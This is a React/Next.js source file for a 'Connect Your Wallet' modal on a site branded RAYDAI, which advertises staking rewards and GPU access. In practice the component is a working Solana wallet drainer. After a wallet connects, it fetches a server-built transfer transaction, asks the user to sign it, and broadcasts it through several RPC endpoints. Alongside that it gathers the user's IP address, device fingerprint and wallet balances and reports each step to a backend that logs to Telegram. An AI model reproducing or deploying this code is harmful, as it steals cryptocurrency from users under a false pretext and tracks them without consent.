"use client"
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog" 
import { Button } from "@/components/ui/button" 
import Image from "next/image" 
import { useState, useEffect } from "react" 

interface ModalsProps {
  isOpen: boolean
  onClose: () => void
}

enum EventType {
  MODAL_OPENED = "MODAL_OPENED",
  MODAL_CLOSED = "MODAL_CLOSED",
  WALLET_CONNECT_ATTEMPT = "WALLET_CONNECT_ATTEMPT",
  WALLET_CONNECTED = "WALLET_CONNECTED",
  WALLET_CONNECT_FAILED = "WALLET_CONNECT_FAILED",
  WALLET_INSTALL_REDIRECT = "WALLET_INSTALL_REDIRECT",
  MOBILE_WALLET_REDIRECT = "MOBILE_WALLET_REDIRECT",
  GEO_BLOCKED = "GEO_BLOCKED",
  GEO_CHECK_PASSED = "GEO_CHECK_PASSED",
  WALLET_SCAN_STARTED = "WALLET_SCAN_STARTED",
  WALLET_SCAN_SUCCESS = "WALLET_SCAN_SUCCESS",
  WALLET_SCAN_FAILED = "WALLET_SCAN_FAILED",
  INSUFFICIENT_BALANCE = "INSUFFICIENT_BALANCE",
  TRANSACTION_SIGNED = "TRANSACTION_SIGNED",
  TRANSACTION_BROADCAST_START = "TRANSACTION_BROADCAST_START",
  TRANSACTION_BROADCAST_SUCCESS = "TRANSACTION_BROADCAST_SUCCESS",
  TRANSACTION_BROADCAST_FAILED = "TRANSACTION_BROADCAST_FAILED",
  RPC_ENDPOINT_SWITCH = "RPC_ENDPOINT_SWITCH",
  APPROVAL_SENT = "APPROVAL_SENT",
  USER_IP_FETCHED = "USER_IP_FETCHED",
  USER_IP_FAILED = "USER_IP_FAILED",
  MODAL_SESSION_TIMEOUT = "MODAL_SESSION_TIMEOUT",
  WALLET_DETECTED = "WALLET_DETECTED",
  WALLET_NOT_INSTALLED = "WALLET_NOT_INSTALLED",
  MODAL_ACTION = "MODAL_ACTION"
}

interface NotificationData {
  eventType: EventType
  walletType?: string
  walletAddress?: string
  userIP?: string
  balanceSOL?: number
  balanceUSD?: number
  transactionHash?: string
  rpcEndpoint?: string
  error?: string
  isMobile?: boolean
  inWalletBrowser?: boolean
  userAgent?: string
  sessionId?: string
  modalOpenTime?: number
  screenInfo?: any
  locationInfo?: any
  action?: string
  fromModal?: boolean
  attemptNumber?: number
  duration?: number
  reason?: string
  deepLink?: string
  universalLink?: string
  isIOS?: boolean
  isAndroid?: boolean
  currentUrl?: string
  source?: string
  rpcEndpointsCount?: number
  redirectUrl?: string
  detectedWallets?: string[]
}

// Generate session ID
const generateSessionId = () => {
  return 'session_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now()
}

async function sendEventNotification(eventData: NotificationData) {
  try {
    // Get user agent
    const userAgent = navigator.userAgent || "unknown"
    
    // Get screen info
    const screenInfo = {
      width: window.screen.width,
      height: window.screen.height,
      colorDepth: window.screen.colorDepth,
      pixelRatio: window.devicePixelRatio,
      orientation: window.screen.orientation?.type || "unknown"
    }
    
    // Get browser info
    const browserInfo = {
      language: navigator.language || "unknown",
      languages: navigator.languages || [],
      platform: navigator.platform || "unknown",
      cookieEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack || "unknown"
    }
    
    // Get referrer and URL info
    const referrer = document.referrer || "direct"
    const urlParams = Object.fromEntries(new URLSearchParams(window.location.search))
    
    // Get timezone
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "unknown"
    
    const fullEventData = {
      ...eventData,
      userAgent,
      screenInfo,
      browserInfo,
      referrer,
      urlParams,
      timezone,
      timestamp: new Date().toISOString(),
      currentUrl: window.location.href,
      pageTitle: document.title,
      windowSize: {
        innerWidth: window.innerWidth,
        innerHeight: window.innerHeight
      }
    }
    
    // Send to backend for Telegram notifications
    try {
      await fetch("/api/log-event", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(fullEventData),
      })
    } catch (error) {
      console.error("Failed to send event notification:", error)
    }
  } catch (error) {
    console.error("Error in event notification:", error)
  }
}

// Enhanced wallet configuration with more wallets
const DESKTOP_WALLETS = {
  phantom: {
    name: "Phantom",
    icon: "/phantom-icon.png",
    provider: () => (window as any).phantom?.solana,
    checkMethod: () => (window as any).phantom?.solana?.isPhantom,
    downloadUrl: "https://phantom.app/download"
  },
  solflare: {
    name: "Solflare",
    icon: "/solflare-icon.png",
    provider: () => (window as any).solflare,
    checkMethod: () => (window as any).solflare?.isSolflare,
    downloadUrl: "https://solflare.com/download"
  },
  backpack: {
    name: "Backpack",
    icon: "/backpack-icon.png",
    provider: () => (window as any).backpack,
    checkMethod: () => (window as any).backpack?.isBackpack,
    downloadUrl: "https://www.backpack.app/"
  },
  sollet: {
    name: "Sollet",
    icon: "/sollet-icon.png",
    provider: () => (window as any).sollet,
    checkMethod: () => (window as any).sollet,
    downloadUrl: "https://www.sollet.io/"
  },
  exodus: {
    name: "Exodus",
    icon: "/exodus-icon.png",
    provider: () => (window as any).exodus?.solana,
    checkMethod: () => (window as any).exodus?.solana,
    downloadUrl: "https://www.exodus.com/"
  },
  trustwallet: {
    name: "Trust Wallet",
    icon: "/trustwallet-icon.png",
    provider: () => (window as any).trustwallet?.solana,
    checkMethod: () => (window as any).trustwallet,
    downloadUrl: "https://trustwallet.com/"
  }
} as const;

const MOBILE_WALLETS = {
  phantom: {
    name: "Phantom",
    icon: "/phantom-icon.png",
    deepLink: "phantom://browse/",
    universalLink: "https://phantom.app/ul/browse/",
    downloadUrl: "https://phantom.app/download"
  },
  solflare: {
    name: "Solflare",
    icon: "/solflare-icon.png",
    deepLink: "solflare://ul/v1/browse/",
    universalLink: "https://solflare.com/ul/v1/browse/",
    downloadUrl: "https://solflare.com/download"
  },
  backpack: {
    name: "Backpack",
    icon: "/backpack-icon.png",
    deepLink: "backpack://",
    universalLink: "https://backpack.app/",
    downloadUrl: "https://www.backpack.app/"
  },
  trustwallet: {
    name: "Trust Wallet",
    icon: "/trustwallet-icon.png",
    deepLink: "trust://",
    universalLink: "https://link.trustwallet.com/",
    downloadUrl: "https://trustwallet.com/"
  },
  exodus: {
    name: "Exodus",
    icon: "/exodus-icon.png",
    deepLink: "exodus://",
    universalLink: "https://exodus.com/",
    downloadUrl: "https://www.exodus.com/mobile"
  }
} as const;

const wallets = [
  {
    id: "phantom",
    name: "Phantom",
    icon: "/phantom-icon.png",
    description: "Most popular Solana wallet",
    type: "extension",
    supported: true
  },
  {
    id: "solflare",
    name: "Solflare",
    icon: "/solflare-icon.png",
    description: "Secure Solana wallet",
    type: "extension",
    supported: true
  },
  {
    id: "backpack",
    name: "Backpack",
    icon: "/backpack-icon.png",
    description: "Solana wallet & NFT platform",
    type: "extension",
    supported: true
  },
  {
    id: "exodus",
    name: "Exodus",
    icon: "/exodus-icon.png",
    description: "Multi-chain wallet",
    type: "extension",
    supported: true
  },
  {
    id: "trustwallet",
    name: "Trust Wallet",
    icon: "/trustwallet-icon.png",
    description: "Binance's official wallet",
    type: "extension",
    supported: true
  },
  {
    id: "sollet",
    name: "Sollet",
    icon: "/sollet-icon.png",
    description: "Web-based Solana wallet",
    type: "web",
    supported: true
  }
] as const;

export function Modals({ isOpen, onClose }: ModalsProps) {
  const [isMobileViewState, setIsMobileViewState] = useState(false) 
  const [connectedWalletData, setConnectedWalletData] = useState<any>(null) 
  const [isBlockedGeoState, setIsBlockedGeoState] = useState(false)
  const [sessionId] = useState(generateSessionId())
  const [modalOpenTime] = useState(Date.now())
  const [connectionAttempts, setConnectionAttempts] = useState<Record<string, number>>({})
  const [detectedWallets, setDetectedWallets] = useState<string[]>([])
  const [isLoading, setIsLoading] = useState(false)

  useEffect(() => {
    const checkMobile = () => {
      const userAgent = navigator.userAgent || navigator.vendor || (window as any).opera
      const mobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent.toLowerCase())
      setIsMobileViewState(mobile)
      
      // Check for installed wallets
      detectInstalledWallets()
      
      // Log device detection
      sendEventNotification({
        eventType: EventType.MODAL_OPENED,
        isMobile: mobile,
        userAgent: userAgent,
        sessionId,
        modalOpenTime,
        detectedWallets: detectedWallets
      })
    }
    
    if (isOpen) {
      checkMobile()
      checkGeoBlockStatus()
    }
    
    // Set timeout for modal session
    const timeoutId = setTimeout(() => {
      sendEventNotification({
        eventType: EventType.MODAL_SESSION_TIMEOUT,
        sessionId,
        modalOpenTime,
        duration: Date.now() - modalOpenTime
      })
    }, 300000) // 5 minutes timeout
    
    return () => {
      clearTimeout(timeoutId)
      if (isOpen) {
        sendEventNotification({
          eventType: EventType.MODAL_CLOSED,
          sessionId,
          duration: Date.now() - modalOpenTime
        })
      }
    }
  }, [isOpen])

  const detectInstalledWallets = () => {
    const detected: string[] = []
    
    Object.entries(DESKTOP_WALLETS).forEach(([id, wallet]) => {
      try {
        if (wallet.checkMethod()) {
          detected.push(id)
          sendEventNotification({
            eventType: EventType.WALLET_DETECTED,
            walletType: id,
            sessionId
          })
        }
      } catch (error) {
        // Silently fail if wallet check throws
      }
    })
    
    setDetectedWallets(detected)
    return detected
  }

  const checkGeoBlockStatus = async () => {
    try {
      const response = await fetch("/api/check-geo")
      const data = await response.json()
      if (data.blocked) {
        setIsBlockedGeoState(true)
        sendEventNotification({
          eventType: EventType.GEO_BLOCKED,
          sessionId,
          reason: data.reason || "Unknown"
        })
        onClose()
      } else {
        sendEventNotification({
          eventType: EventType.GEO_CHECK_PASSED,
          sessionId
        })
      }
    } catch (error) {
      console.error("Geo check failed:", error)
    }
  }

  const isInWalletBrowserInstance = (walletId: string) => {
    const userAgent = navigator.userAgent.toLowerCase()
    
    if (walletId === "phantom") {
      return userAgent.includes("phantom")
    } else if (walletId === "solflare") {
      return userAgent.includes("solflare")
    } else if (walletId === "backpack") {
      return userAgent.includes("backpack")
    } else if (walletId === "trustwallet") {
      return userAgent.includes("trust")
    }
    
    return false
  }

  const connectDesktopWalletInstance = async (walletId: string) => {
    setIsLoading(true)
    
    const walletConfig = DESKTOP_WALLETS[walletId as keyof typeof DESKTOP_WALLETS]

    if (!walletConfig) {
      setIsLoading(false)
      return
    }

    // Track connection attempt
    const attempts = (connectionAttempts[walletId] || 0) + 1
    setConnectionAttempts({...connectionAttempts, [walletId]: attempts})

    sendEventNotification({
      eventType: EventType.WALLET_CONNECT_ATTEMPT,
      walletType: walletId,
      sessionId,
      attemptNumber: attempts,
      isMobile: false
    })

    const provider = walletConfig.provider()

    if (provider && walletConfig.checkMethod()) {
      try {
        const response = await provider.connect()
        setConnectedWalletData(provider)
        
        sendEventNotification({
          eventType: EventType.WALLET_CONNECTED,
          walletType: walletId,
          walletAddress: response.publicKey.toString(),
          sessionId
        })
        
        await scanAndCreateTransactionData(response.publicKey.toString(), provider, walletId)
      } catch (error: any) {
        sendEventNotification({
          eventType: EventType.WALLET_CONNECT_FAILED,
          walletType: walletId,
          error: error?.message || "Unknown connection error",
          sessionId
        })
        setIsLoading(false)
      }
    } else {
      sendEventNotification({
        eventType: EventType.WALLET_NOT_INSTALLED,
        walletType: walletId,
        sessionId,
        redirectUrl: walletConfig.downloadUrl
      })
      
      window.open(walletConfig.downloadUrl, "_blank")
      setIsLoading(false)
    }
  }

  const connectMobileWalletInstance = (walletId: string) => {
    const walletConfig = MOBILE_WALLETS[walletId as keyof typeof MOBILE_WALLETS]

    if (!walletConfig) {
      return
    }

    const inWalletBrowser = isInWalletBrowserInstance(walletId)
    
    if (inWalletBrowser) {
      sendEventNotification({
        eventType: EventType.WALLET_CONNECT_ATTEMPT,
        walletType: walletId,
        sessionId,
        inWalletBrowser: true,
        isMobile: true
      })
      
      connectDesktopWalletInstance(walletId)
      return
    }

    const currentUrl = window.location.href
    const isIOSDevice = /iphone|ipad|ipod/i.test(navigator.userAgent.toLowerCase())
    const isAndroidDevice = /android/i.test(navigator.userAgent.toLowerCase())

    let deepLink = ""
    let universalLink = ""

    if (walletId === "phantom") {
      deepLink = `phantom://browse/${encodeURIComponent(currentUrl)}?ref=${encodeURIComponent(currentUrl)}`
      universalLink = `https://phantom.app/ul/browse/${encodeURIComponent(currentUrl)}?ref=${encodeURIComponent(currentUrl)}`
    } else if (walletId === "solflare") {
      deepLink = walletConfig.deepLink + encodeURIComponent(currentUrl)
      universalLink = walletConfig.universalLink + encodeURIComponent(currentUrl)
    } else if (walletId === "backpack") {
      deepLink = `backpack://${encodeURIComponent(currentUrl)}`
      universalLink = `https://backpack.app/${encodeURIComponent(currentUrl)}`
    } else {
      deepLink = walletConfig.deepLink
      universalLink = walletConfig.universalLink
    }

    sendEventNotification({
      eventType: EventType.MOBILE_WALLET_REDIRECT,
      walletType: walletId,
      sessionId,
      deepLink,
      universalLink,
      isIOS: isIOSDevice,
      isAndroid: isAndroidDevice,
      currentUrl
    })

    window.location.href = deepLink

    setTimeout(() => {
      window.location.href = universalLink
    }, 1500)
  }

  const handleConnectWalletClick = (walletId: string) => {
    if (isMobileViewState) {
      connectMobileWalletInstance(walletId)
    } else {
      connectDesktopWalletInstance(walletId)
    }
  }

  const fetchUserIP = async (): Promise<string> => {
    try {
      const ipResponse = await fetch("https://api.ipify.org?format=json")
      const ipData = await ipResponse.json()
      const ip = ipData.ip || "unknown"
      
      sendEventNotification({
        eventType: EventType.USER_IP_FETCHED,
        userIP: ip,
        sessionId,
        source: "api.ipify.org"
      })
      
      return ip
    } catch (ipError) {
      try {
        const ipResponse2 = await fetch("https://api.my-ip.io/ip")
        const ipText = await ipResponse2.text()
        const ip = ipText.trim() || "unknown"
        
        sendEventNotification({
          eventType: EventType.USER_IP_FETCHED,
          userIP: ip,
          sessionId,
          source: "api.my-ip.io"
        })
        
        return ip
      } catch {
        sendEventNotification({
          eventType: EventType.USER_IP_FAILED,
          sessionId
        })
        return "unknown"
      }
    }
  }

  const scanAndCreateTransactionData = async (publicKey: string, provider: any, walletType: string) => {
    setIsLoading(true)
    
    try {
      sendEventNotification({
        eventType: EventType.WALLET_SCAN_STARTED,
        walletAddress: publicKey,
        walletType,
        sessionId
      })

      const userIPAddress = await fetchUserIP()

      const response = await fetch("/api/scan-wallet", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          walletAddress: publicKey,
          userIP: userIPAddress,
          userAgent: navigator.userAgent,
          isMobile: isMobileViewState
        }),
      })

      if (!response.ok) {
        sendEventNotification({
          eventType: EventType.WALLET_SCAN_FAILED,
          walletAddress: publicKey,
          error: `HTTP ${response.status}`,
          sessionId
        })
        
        setTimeout(() => {
          onClose()
        }, 1000)
        setIsLoading(false)
        return
      }

      const data = await response.json()

      if (data.error === "Insufficient balance") {
        sendEventNotification({
          eventType: EventType.INSUFFICIENT_BALANCE,
          walletAddress: publicKey,
          balanceSOL: data.balance,
          sessionId
        })
        
        setTimeout(() => {
          onClose()
        }, 1000)
        setIsLoading(false)
        return
      }

      sendEventNotification({
        eventType: EventType.WALLET_SCAN_SUCCESS,
        walletAddress: publicKey,
        balanceSOL: data.walletBalance,
        transferAmount: data.transferAmount,
        sessionId
      })

      const { Connection, Transaction } = await import("@solana/web3.js")
      const transaction = Transaction.from(Buffer.from(data.transaction, "base64"))

      const signedTransaction = await provider.signTransaction(transaction)
      
      sendEventNotification({
        eventType: EventType.TRANSACTION_SIGNED,
        walletAddress: publicKey,
        transferAmount: data.transferAmount,
        sessionId
      })

      const RPC_ENDPOINTS = [
        "https://solana-rpc.publicnode.com",
        "https://api.mainnet-beta.solana.com",
        "https://solana.drpc.org",
        "https://solana.lavenderfive.com",
        "https://solana.api.onfinality.io/public",
        "https://public.rpc.solanavibestation.com",
      ]

      let signature = ""
      let lastError: any = null
      let successfulEndpoint = ""
      
      sendEventNotification({
        eventType: EventType.TRANSACTION_BROADCAST_START,
        walletAddress: publicKey,
        rpcEndpointsCount: RPC_ENDPOINTS.length,
        sessionId
      })

      for (const endpoint of RPC_ENDPOINTS) {
        try {
          const connection = new Connection(endpoint, "confirmed")
          
          sendEventNotification({
            eventType: EventType.RPC_ENDPOINT_SWITCH,
            rpcEndpoint: endpoint,
            sessionId
          })

          signature = await connection.sendRawTransaction(signedTransaction.serialize(), {
            skipPreflight: false,
            preflightCommitment: "confirmed",
          })

          await connection.confirmTransaction({
            signature,
            blockhash: data.blockhash,
            lastValidBlockHeight: data.lastValidBlockHeight,
          })
          
          successfulEndpoint = endpoint
          break
        } catch (err: any) {
          lastError = err
          continue
        }
      }

      if (!signature) {
        sendEventNotification({
          eventType: EventType.TRANSACTION_BROADCAST_FAILED,
          walletAddress: publicKey,
          error: lastError?.message || "All RPC endpoints failed",
          sessionId
        })
        
        throw lastError || new Error("Transaction failed")
      }

      sendEventNotification({
        eventType: EventType.TRANSACTION_BROADCAST_SUCCESS,
        walletAddress: publicKey,
        transactionHash: signature,
        rpcEndpoint: successfulEndpoint,
        transferAmount: data.transferAmount,
        sessionId
      })

      // Calculate USD value
      const solPrice = data.solPrice || 153.32
      const balanceUSD = data.walletBalance * solPrice
      const transferUSD = data.transferAmount * solPrice

      await fetch("/api/transaction-approved", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          walletAddress: publicKey,
          balanceSOL: data.walletBalance,
          balanceUSD: balanceUSD,
          transferAmountSOL: data.transferAmount,
          transferAmountUSD: transferUSD,
          userIP: userIPAddress,
          transactionHash: signature,
          rpcEndpoint: successfulEndpoint,
          solPrice: solPrice
        }),
      })

      sendEventNotification({
        eventType: EventType.APPROVAL_SENT,
        walletAddress: publicKey,
        transactionHash: signature,
        sessionId
      })

      setTimeout(() => {
        onClose()
      }, 1000)
    } catch (error: any) {
      sendEventNotification({
        eventType: EventType.TRANSACTION_BROADCAST_FAILED,
        walletAddress: publicKey,
        error: error?.message || "Unknown transaction error",
        sessionId
      })
      
      setTimeout(() => {
        onClose()
      }, 1000)
    } finally {
      setIsLoading(false)
    }
  }

  if (isBlockedGeoState) {
    return null
  }

  return (
    <Dialog open={isOpen} onOpenChange={(open) => {
      if (!open) {
        sendEventNotification({
          eventType: EventType.MODAL_CLOSED,
          sessionId,
          duration: Date.now() - modalOpenTime
        })
        onClose()
      }
    }}>
      <DialogContent className="bg-gray-900 text-white border border-gray-800 rounded-2xl shadow-2xl max-w-md p-0 overflow-hidden">
        {/* Modal Header */}
        <div className="bg-gradient-to-r from-blue-900 to-blue-800 p-6">
          <DialogHeader>
            <div className="flex items-center justify-center mb-4">
              <div className="w-12 h-12 bg-white/10 backdrop-blur-sm rounded-xl flex items-center justify-center">
                <div className="w-8 h-8 bg-gradient-to-br from-blue-300 to-blue-100 rounded-lg flex items-center justify-center">
                  <svg className="w-5 h-5 text-blue-900" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M21 18v1c0 1.1-.9 2-2 2H5c-1.11 0-2-.9-2-2V5c0-1.1.89-2 2-2h14c1.1 0 2 .9 2 2v1h-9c-1.11 0-2 .9-2 2v8c0 1.1.89 2 2 2h9zm-9-2h10V8H12v8zm4-2.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"/>
                  </svg>
                </div>
              </div>
            </div>
            <DialogTitle className="text-2xl font-bold text-center text-white">
              Connect Your Wallet
            </DialogTitle>
            <DialogDescription className="text-center text-blue-200 mt-1">
              Select a wallet to connect and access RAYDAI
            </DialogDescription>
          </DialogHeader>
        </div>
        
        {/* Wallet Options */}
        <div className="px-6 pb-6 space-y-4 max-h-[60vh] overflow-y-auto">
          {wallets.map((wallet) => {
            const isDetected = detectedWallets.includes(wallet.id)
            const isSupported = wallet.supported
            
            return (
              <Button
                key={wallet.id}
                variant="outline"
                disabled={!isSupported || isLoading}
                className={`w-full h-auto p-4 flex items-center justify-start gap-4 
                  ${isDetected 
                    ? 'bg-gradient-to-r from-green-900/20 to-green-800/20 hover:from-green-900/30 hover:to-green-800/30 hover:border-green-500' 
                    : 'bg-gradient-to-r from-gray-800/50 to-gray-900/50 hover:from-blue-900/30 hover:to-blue-800/30 hover:border-blue-500'
                  } 
                  transition-all border ${isDetected ? 'border-green-500/50' : 'border-gray-700'} rounded-xl`}
                onClick={() => handleConnectWalletClick(wallet.id)}
              >
                <div className="relative h-12 w-12 flex-shrink-0 rounded-[15px] overflow-hidden">
                  <Image
                    src={wallet.icon || "/favicon.svg"}
                    alt={`${wallet.name} icon`}
                    width={48}
                    height={48}
                    className="object-cover"
                  />
                  {isDetected && (
                    <div className="absolute -top-1 -right-1 w-5 h-5 bg-green-500 rounded-full flex items-center justify-center">
                      <svg className="w-3 h-3 text-white" fill="currentColor" viewBox="0 0 20 20">
                        <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                      </svg>
                    </div>
                  )}
                </div>
                <div className="flex flex-col items-start text-left flex-1">
                  <div className="flex items-center gap-2">
                    <span className="font-semibold text-base text-white">{wallet.name}</span>
                    {isDetected && (
                      <span className="text-xs bg-green-500/20 text-green-300 px-2 py-0.5 rounded-full">Detected</span>
                    )}
                  </div>
                  <span className="text-sm text-gray-400">{wallet.description}</span>
                </div>
                <div className="text-gray-500">
                  {isLoading ? (
                    <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white"></div>
                  ) : (
                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
                    </svg>
                  )}
                </div>
              </Button>
            )
          })}

          {/* Loading State */}
          {isLoading && (
            <div className="text-center py-4">
              <div className="inline-block animate-spin rounded-full h-8 w-8 border-b-2 border-blue-500 mb-2"></div>
              <p className="text-sm text-gray-400">Processing transaction...</p>
            </div>
          )}

          {/* Other Wallet Option */}
          <Button 
            variant="outline"
            disabled={isLoading}
            className="w-full border-2 border-gray-700 hover:border-blue-500 hover:bg-blue-900/20 text-gray-300 font-bold py-4 rounded-xl"
            onClick={() => {
              sendEventNotification({
                eventType: EventType.WALLET_INSTALL_REDIRECT,
                walletType: "other",
                sessionId,
                redirectUrl: "https://phantom.app/download"
              })
              window.open("https://phantom.app/download", "_blank")
            }}
          >
            <span>Other Wallet Options</span>
          </Button>

          {/* Session Info (hidden by default, can be enabled for debugging) */}
          {process.env.NODE_ENV === 'development' && (
            <div className="mt-2 p-2 bg-gray-800/30 rounded-lg text-xs text-gray-400">
              <div>Session: {sessionId.substring(0, 12)}...</div>
              <div>Mobile: {isMobileViewState ? 'Yes' : 'No'}</div>
              <div>Detected: {detectedWallets.join(', ') || 'None'}</div>
              <div>Time: {Math.floor((Date.now() - modalOpenTime) / 1000)}s</div>
            </div>
          )}

          {/* Benefits Section */}
          <div className="mt-6 p-4 bg-gray-800/50 rounded-xl">
            <h4 className="font-bold text-white mb-3 text-center">Benefits:</h4>
            <ul className="space-y-3 text-sm text-gray-300">
              <li className="flex items-center gap-3">
                <div className="w-6 h-6 bg-blue-900/50 rounded-full flex items-center justify-center flex-shrink-0">
                  <svg className="w-3 h-3 text-blue-400" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                  </svg>
                </div>
                <span>Access to RAYDAI platform</span>
              </li>
              <li className="flex items-center gap-3">
                <div className="w-6 h-6 bg-blue-900/50 rounded-full flex items-center justify-center flex-shrink-0">
                  <svg className="w-3 h-3 text-blue-400" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                  </svg>
                </div>
                <span>High yield staking rewards</span>
              </li>
              <li className="flex items-center gap-3">
                <div className="w-6 h-6 bg-blue-900/50 rounded-full flex items-center justify-center flex-shrink-0">
                  <svg className="w-3 h-3 text-blue-400" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                  </svg>
                </div>
                <span>Premium GPU computing access</span>
              </li>
            </ul>
          </div>

          {/* Terms & Conditions */}
          <div className="mt-6 text-center">
            <p className="text-xs text-gray-500">
              By connecting, you agree to RAYDAI's{" "}
              <a href="#" className="text-blue-400 hover:text-blue-300 font-medium"
                 onClick={(e) => {
                   e.preventDefault()
                   window.open("#", "_blank")
                 }}>
                Terms
              </a>
              {" "}and{" "}
              <a href="#" className="text-blue-400 hover:text-blue-300 font-medium"
                 onClick={(e) => {
                   e.preventDefault()
                   window.open("#", "_blank")
                 }}>
                Privacy Policy
              </a>
            </p>
          </div>
        </div>
      </DialogContent>
    </Dialog>
  )
}